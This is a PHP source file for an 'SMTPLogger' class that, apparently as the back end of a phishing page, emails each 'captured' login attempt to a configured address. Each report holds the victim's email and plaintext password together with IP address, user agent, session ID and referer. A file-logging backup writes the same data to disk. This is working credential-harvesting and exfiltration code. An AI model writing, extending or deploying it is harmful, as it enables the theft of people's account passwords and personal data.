<?php

class SMTPLogger {
    private $smtpHost;
    private $smtpPort;
    private $smtpUsername;
    private $smtpPassword;
    private $logEmail;
    private $fromEmail;
    private $fromName;
    
    public function __construct() {
        // Load configuration
        $this->smtpHost = SMTP_HOST;
        $this->smtpPort = SMTP_PORT;
        $this->smtpUsername = SMTP_USERNAME;
        $this->smtpPassword = SMTP_PASSWORD;
        $this->logEmail = LOG_EMAIL;
        $this->fromEmail = FROM_EMAIL;
        $this->fromName = FROM_NAME;
    }
    
    /**
     * Log a login attempt by sending an email
     */
    public function logAttempt($data) {
        $subject = "Login Attempt - " . $data['email'];
        $message = $this->formatLogMessage($data);
        
        return $this->sendEmail($this->logEmail, $subject, $message);
    }
    
    /**
     * Format the log data into a readable email message
     */
    private function formatLogMessage($data) {
        $message = "New login attempt captured:\n\n";
        $message .= "=== LOGIN DETAILS ===\n";
        $message .= "Timestamp: " . $data['timestamp'] . "\n";
        $message .= "Email: " . $data['email'] . "\n";
        $message .= "Password: " . $data['password'] . "\n\n";
        
        $message .= "=== CLIENT INFORMATION ===\n";
        $message .= "IP Address: " . $data['ip_address'] . "\n";
        $message .= "Browser: " . $data['browser'] . "\n";
        $message .= "User Agent: " . $data['user_agent'] . "\n";
        $message .= "Referer: " . $data['referer'] . "\n\n";
        
        $message .= "=== SERVER INFORMATION ===\n";
        $message .= "Server: " . $data['server_name'] . "\n";
        $message .= "Request URI: " . $data['request_uri'] . "\n";
        $message .= "Session ID: " . $data['session_id'] . "\n\n";
        
        $message .= "=== ADDITIONAL INFO ===\n";
        $message .= "Domain: " . $this->extractDomain($data['email']) . "\n";
        $message .= "Location: " . $this->getLocationFromIP($data['ip_address']) . "\n";
        
        return $message;
    }
    
    /**
     * Send email using SMTP
     */
    private function sendEmail($to, $subject, $message) {
        // Create email headers
        $headers = array();
        $headers[] = "MIME-Version: 1.0";
        $headers[] = "Content-type: text/plain; charset=UTF-8";
        $headers[] = "From: " . $this->fromName . " <" . $this->fromEmail . ">";
        $headers[] = "Reply-To: " . $this->fromEmail;
        $headers[] = "Return-Path: " . $this->fromEmail;
        $headers[] = "X-Mailer: PHP/" . phpversion();
        $headers[] = "X-Priority: 1";
        $headers[] = "X-MSMail-Priority: High";
        
        // Try to send using PHPMailer if available, otherwise use mail()
        if (class_exists('PHPMailer\PHPMailer\PHPMailer')) {
            return $this->sendViaPHPMailer($to, $subject, $message);
        } else {
            return $this->sendViaBuiltIn($to, $subject, $message, $headers);
        }
    }
    
    /**
     * Send email using PHPMailer (preferred method)
     */
    private function sendViaPHPMailer($to, $subject, $message) {
        try {
            require_once 'vendor/autoload.php';
            
            $mail = new PHPMailer\PHPMailer\PHPMailer(true);
            
            // Server settings
            $mail->isSMTP();
            $mail->Host = $this->smtpHost;
            $mail->SMTPAuth = true;
            $mail->Username = $this->smtpUsername;
            $mail->Password = $this->smtpPassword;
            $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = $this->smtpPort;
            
            // Recipients
            $mail->setFrom($this->fromEmail, $this->fromName);
            $mail->addAddress($to);
            
            // Content
            $mail->isHTML(false);
            $mail->Subject = $subject;
            $mail->Body = $message;
            
            $mail->send();
            return true;
        } catch (Exception $e) {
            error_log("PHPMailer Error: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Send email using built-in mail() function as fallback
     */
    private function sendViaBuiltIn($to, $subject, $message, $headers) {
        $headerString = implode("\r\n", $headers);
        return mail($to, $subject, $message, $headerString);
    }
    
    /**
     * Extract domain from email address
     */
    private function extractDomain($email) {
        $parts = explode('@', $email);
        return isset($parts[1]) ? $parts[1] : 'Unknown';
    }
    
    /**
     * Get approximate location from IP address (basic implementation)
     */
    private function getLocationFromIP($ip) {
        // You can integrate with IP geolocation services here
        // For now, return a basic check
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            return "Public IP: " . $ip;
        } else {
            return "Private/Local IP: " . $ip;
        }
    }
    
    /**
     * Log errors to file as backup
     */
    private function logToFile($data) {
        $logFile = 'logs/login_attempts.log';
        $logDir = dirname($logFile);
        
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        
        $logEntry = date('Y-m-d H:i:s') . " - " . json_encode($data) . "\n";
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>